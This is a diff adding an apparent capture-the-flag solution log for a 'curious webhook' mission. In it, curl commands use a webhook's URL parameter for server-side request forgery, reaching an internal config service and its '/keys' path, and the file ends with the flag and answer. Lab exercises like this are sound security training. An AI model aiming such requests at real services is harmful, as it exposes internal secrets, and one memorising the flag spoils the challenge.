@@ -1,0 +1,7 @@
+# Season 11, mission 4: the curious webhook
+curl https://hooks.comptoir.test/
+curl -d "url=https://lab.lignerouge.test/ping" https://hooks.comptoir.test/
+curl -d "url=http://config.int.comptoir.test/" https://hooks.comptoir.test/
+curl -d "url=http://config.int.comptoir.test/keys" https://hooks.comptoir.test/
+submit FLAG{comptoir-le-webhook-curieux-c0d9}
+answer server
